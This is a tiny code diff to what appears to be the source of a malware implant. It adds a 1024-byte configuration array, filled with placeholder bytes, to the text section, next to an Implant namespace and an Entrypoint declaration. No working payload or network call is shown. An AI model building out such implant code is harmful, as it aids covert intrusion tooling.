@@ -3,6 +3,9 @@
 #include <core/corelib.hpp>
 
 EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
+_text(F) BYTE __config[1024] = {
+    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
+};
 
 namespace Implant {
     FUNCTION VOID MainRoutine();
